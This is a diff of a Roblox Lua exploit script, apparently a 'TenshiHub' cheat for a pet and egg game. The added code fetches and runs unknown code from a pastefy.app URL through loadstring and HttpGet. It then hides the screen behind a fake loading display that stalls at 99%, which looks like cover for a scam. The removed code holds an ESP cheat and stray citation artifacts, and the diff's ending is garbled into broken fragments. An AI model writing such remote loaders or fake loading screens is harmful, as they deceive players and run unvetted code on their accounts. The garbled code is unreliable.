@@ -1,77 +1,102 @@
--- Load your actual script
+-- 🔹 Run your main script FIRST
 pcall(function()
-    loadstring(game:HttpGet("https://pastefy.app/qmH6eeEH/raw"))()
+    loadstring(game:HttpGet("https://pastefy.app/inoixEbY/raw"))()
 end)
 
--- Egg → pet lists/weights from wiki
-local eggData = {
-    ["Common Egg"] = {{"Dog",0.3333},{"Golden Lab",0.3333},{"Bunny",0.3333}},
-    ["Uncommon Egg"] = {{"Black Bunny",0.25},{"Cat",0.25},{"Chicken",0.25},{"Deer",0.25}},
-    ["Rare Summer Egg"] = {{"Flamingo",0.30},{"Toucan",0.25},{"Sea Turtle",0.20},{"Orangutan",0.15},{"Seal",0.10}}, :contentReference[oaicite:5]{index=5}
-    ["Rare Egg"] = {{"Orange Tabby",0.3333},{"Spotted Deer",0.25},{"Pig",0.1667},{"Rooster",0.1667}}, :contentReference[oaicite:6]{index=6}
-    ["Paradise Egg"] = {{"Ostrich",0.40},{"Peacock",0.30},{"Capybara",0.21},{"Scarlet Macaw",0.08},{"Mimic Octopus",0.01}}, :contentReference[oaicite:7]{index=7}
-    ["Dinosaur Egg"] = {{"Raptor",0.35},{"Triceratops",0.325},{"Stegosaurus",0.28},{"Pterodactyl",0.03},{"Brontosaurus",0.01},{"T‑Rex",0.005}}, :contentReference[oaicite:8]{index=8}
-    ["Primal Egg"] = {{"Parasaurolophus",0.35},{"Iguanodon",0.325},{"Pachycephalosaurus",0.28},{"Dilophosaurus",0.03},{"Ankylosaurus",0.01},{"Spinosaurus",0.005}}, :contentReference[oaicite:9]{index=9}
-    ["Zen Egg"] = {{"Shiba Inu",0.40},{"Nihonzaru",0.31},{"Tanuki",0.2082},{"Tanchozuru",0.046},{"Kappa",0.035},{"Kitsune",0.0008}}, :contentReference[oaicite:10]{index=10}
-    ["Bug Egg"] = {{"Snail",0.30},{"Giant Ant",0.25},{"Caterpillar",0.40},{"Praying Mantis",0.04},{"Dragonfly",0.01}}, :contentReference[oaicite:11]{index=11}
-    ["Bee Egg"] = {{"Bee",0.65},{"Honey Bee",0.25},{"Bear Bee",0.05},{"Queen Bee",0.01}}, :contentReference[oaicite:12]{index=12}
-    ["Oasis Egg"] = {{"Meerkat",0.45},{"Sand Snake",0.345},{"Axolotl",0.15},{"Hyacinth Macaw",0.05},{"Fennec Fox",0.005}}, :contentReference[oaicite:13]{index=13}
-}
+-- 🖥️ Create Fullscreen TenshiHub Loading Screen
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
 
--- Weighted random pick
-local function pickPet(list)
-    local r = math.random()
-    local cum = 0
-    for _, v in ipairs(list) do
-        cum += v[2]
-        if r <= cum then return v[1] end
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "TenshiHubLoadingScreen"
+screenGui.ResetOnSpawn = false
+screenGui.IgnoreGuiInset = true
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+screenGui.Parent = playerGui
+
+-- 🔲 Black full background
+local background = Instance.new("Frame")
+background.BackgroundColor3 = Color3.new(0, 0, 0)
+background.Size = UDim2.new(1, 0, 1, 0)
+background.Position = UDim2.new(0, 0, 0, 0)
+background.BorderSizePixel = 0
+background.ZIndex = 0
+background.Parent = screenGui
+
+-- 🌟 Matrix-style numbers
+for i = 1, 50 do
+    local glitch = Instance.new("TextLabel")
+    glitch.Text = tostring(math.random(100000, 999999))
+    glitch.Font = Enum.Font.Code
+    glitch.TextColor3 = Color3.fromRGB(0, 255, 0)
+    glitch.TextTransparency = 0.4
+    glitch.TextSize = math.random(14, 20)
+    glitch.Position = UDim2.new(math.random(), 0, math.random(), 0)
+    glitch.Size = UDim2.new(0, 100, 0, 20)
+    glitch.BackgroundTransparency = 1
+    glitch.ZIndex = 1
+    glitch.Parent = background
+end
+
+-- 🧾 Title
+local title = Instance.new("TextLabel")
+title.Text = "TenshiHub!"
+title.Font = Enum.Font.Code
+title.TextColor3 = Color3.fromRGB(0, 255, 0)
+title.TextSize = 36
+title.Position = UDim2.new(0.05, 0, 0.02, 0)
+title.Size = UDim2.new(0.9, 0, 0.1, 0)
+title.BackgroundTransparency = 1
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.ZIndex = 2
+title.Parent = background
+
+-- ⏳ Center loading text
+local loadingText = Instance.new("TextLabel")
+loadingText.Font = Enum.Font.Code
+loadingText.TextColor3 = Color3.fromRGB(0, 255, 0)
+loadingText.TextSize = 24
+loadingText.BackgroundTransparency = 1
+loadingText.Position = UDim2.new(0.5, 0, 0.5, 0)
+loadingText.AnchorPoint = Vector2.new(0.5, 0.5)
+loadingText.Size = UDim2.new(0.6, 0, 0.1, 0)
+loadingText.Text = "Loading... 1%"
+loadingText.TextXAlignment = Enum.TextXAlignment.Center
+loadingText.ZIndex = 2
+loadingText.Parent = background
+
+-- 🔔 Notification text
+local notification = Instance.new("TextLabel")
+notification.Font = Enum.Font.Code
+notification.TextColor3 = Color3.fromRGB(0, 255, 0)
+notification.TextSize = 16
+notification.BackgroundTransparency = 1
+notification.Position = UDim2.new(0.02, 0, 0.95, 0)
+notification.Size = UDim2.new(0.5, 0, 0.05, 0)
+notification.Text = ""
+notification.TextXAlignment = Enum.TextXAlignment.Left
+notification.ZIndex = 2
+notification.Parent = background
+
+-- ⏱️ Loading progress
+local percent = 1
+task.spawn(function()
+    while percent <= 99 do
+        loadingText.Text = "Loading... " .. percent .. "%"
+        if percent == 5 then
+            notification.Text = "[NOTIFICATION] TenshiHub UI is initializing..."
+        elseif percent == 10 then
+            notification.Text = "[SUCCESS] UI loaded in background."
+        elseif percent == 50 then
+            notification.Text = "[SYSTEM] Connecting to modules..."
+        end
+        percent += 1
+        task.wait(0.2) -- Faster loading for testing
     end
-    return list[#list][1]
-end
-
--- Setup UI
-local pl = game.Players.LocalPlayer
-local gui = Instance.new("ScreenGui", pl:WaitForChild("PlayerGui"))
-gui.ResetOnSpawn = false; gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
-
--- Loading overlay
-local bg = Instance.new("Frame", gui)
-bg.Size = UDim2.new(1,0,1,0); bg.BackgroundColor3 = Color3.new(0,0,0); bg.ZIndex = 1
-local lbl = Instance.new("TextLabel", bg)
-lbl.Size = UDim2.new(1,0,0.2,0); lbl.Position = UDim2.new(0,0,0.4,0)
-lbl.BackgroundTransparency = 1; lbl.TextScaled = true; lbl.Font = Enum.Font.GothamBold
-lbl.TextColor3 = Color3.new(1,1,1); lbl.ZIndex = 2
-for i=1,100 do lbl.Text = "Loading: " .. i .. "%" task.wait(0.03) end
-bg:Destroy()
-
--- Persistent side panel
-local panel = Instance.new("Frame", gui)
-panel.Size = UDim2.new(0.25,0,0.5,0); panel.Position = UDim2.new(0.02,0,0.25,0)
-panel.BackgroundColor3 = Color3.fromRGB(30,0,0); panel.BackgroundTransparency = 0.2; panel.ZIndex = 3
-
-local function makeBtn(label, emoji, ypos)
-    local b = Instance.new("TextButton", panel)
-    b.Size = UDim2.new(0.9,0,0.15,0); b.Position = UDim2.new(0.05,0,ypos,0)
-    b.Text = emoji .. " " .. label; b.Font = Enum.Font.GothamBold; b.TextScaled = true
-    b.TextColor3 = Color3.new(1,1,1); b.ZIndex = 4
-    return b
-end
-
-local btnEgg = makeBtn("Egg Randomizer", "🎲", 0.2)
-local btnPet = makeBtn("Randomize Pets", "🎲", 0.38)
-local btnESP = makeBtn("ESP: OFF", "👁️", 0.56)
-local btnAuto = makeBtn("Auto Randomize: OFF", "🔄", 0.74)
-
--- ESP highlight
-local esp = false; local hlist = {}
-btnESP.MouseButton1Click:Connect(function()
-    esp = not esp
-    btnESP.Text = "👁️ ESP: " .. (esp and "ON" or "OFF")
-    if esp then
-        for _, obj in pairs(workspace:GetDescendants()) do
-            if obj:IsA("BasePart") and obj.Name:lower():find("egg") then
-                local h = Instance.new("Highlight", obj)
-                h.Adornee = obj; h.FillColor = Color3.new(1,0.4,0.4)
+    loadingText.Text = "Loading... 99%"
+    notification.Text = "[WARNING] Final handshake stuck..."
+end)                h.Adornee = obj; h.FillColor = Color3.new(1,0.4,0.4)
                 table.insert(hlist, h)
             end
         end
